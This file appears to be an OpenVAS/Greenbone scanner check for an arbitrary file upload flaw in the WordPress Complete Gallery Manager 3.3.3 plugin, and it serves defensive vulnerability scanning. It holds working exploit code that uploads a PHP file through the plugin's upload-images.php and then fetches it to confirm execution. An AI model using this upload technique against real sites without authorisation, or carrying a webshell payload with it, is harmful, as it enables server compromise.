CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103790" );
	script_version( "2020-02-26T12:57:19+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-02-26 12:57:19 +0000 (Wed, 26 Feb 2020)" );
	script_tag( name: "creation_date", value: "2013-09-19 11:10:11 +0200 (Thu, 19 Sep 2013)" );
	script_name( "WordPress Plugin Complete Gallery Manager 3.3.3 - Arbitrary File Upload Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_xref( name: "URL", value: "http://www.vulnerability-lab.com/get_content.php?id=1080" );
	script_xref( name: "URL", value: "http://codecanyon.net/item/complete-gallery-manager-for-wordpress/2418606" );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to upload arbitrary code
  and run it in the context of the webserver process. This may facilitate unauthorized
  access or privilege escalation. Other attacks are also possible." );
	script_tag( name: "vuldetect", value: "Upload a file by sending a HTTP POST request." );
	script_tag( name: "insight", value: "The vulnerability is located in the
  /plugins/complete-gallery-manager/frames/ path when processing to upload via the
  upload-images.php file own malicious context or webshells. After the upload the
  remote attacker can access the file with one extension and exchange it with the
  other one to execute for example php codes." );
	script_tag( name: "solution", value: "Vendor updates are available." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "WordPress Complete Gallery Manager plugin is prone to a vulnerability
  that lets attackers upload arbitrary files. The issue occurs because the application
  fails to adequately sanitize user-supplied input." );
	script_tag( name: "affected", value: "WordPress Complete Gallery Manager v3.3.3" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
vtstrings = get_vt_strings();
file = vtstrings["lowercase_rand"] + ".php";
str = vtstrings["lowercase_rand"];
ex = "------------------------------69c0e1752093\r\n" + "Content-Disposition: form-data; name=\"qqfile\"; filename=\"" + file + "\"\r\n" + "Content-Type: application/octet-stream\r\n" + "\r\n" + "<?php echo \"" + str + "\"; ?>\r\n" + "\r\n" + "------------------------------69c0e1752093--";
len = strlen( ex );
req = "POST " + dir + "/wp-content/plugins/complete-gallery-manager/frames/upload-images.php HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "Content-Length: " + len + "\r\n" + "Accept: */*\r\n" + "Expect: 100-continue\r\n" + "Content-Type: multipart/form-data; boundary=----------------------------69c0e1752093\r\n\r\n";
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
send( socket: soc, data: req );
for(;x = recv( socket: soc, length: 1024 );){
	buf += x;
}
if(!IsMatchRegexp( buf, "^HTTP/1\\.[01] 100" )){
	close( soc );
	exit( 99 );
}
send( socket: soc, data: ex + "\r\n" );
for(;y = recv( socket: soc, length: 1024 );){
	buf1 += y;
}
close( soc );
if(!ContainsString( buf1, "\"success\":true" )){
	exit( 99 );
}
url = eregmatch( pattern: "\"url\":\"([^\"]+)\"", string: buf1 );
if(isnull( url[1] )){
	exit( 0 );
}
path = url[1];
path = str_replace( string: path, find: "\\", replace: "" );
l_path = eregmatch( pattern: "(/wp-content/.*)", string: path );
if(isnull( l_path[1] )){
	exit( 99 );
}
url = dir + l_path[1];
req1 = http_get( item: url, port: port );
buf2 = http_send_recv( port: port, data: req1, bodyonly: FALSE );
if(ContainsString( buf2, str )){
	msg = "The scanner was able to upload a file to " + l_path[1] + ". Please remove this file.";
	security_message( port: port, data: msg );
	exit( 0 );
}
exit( 99 );

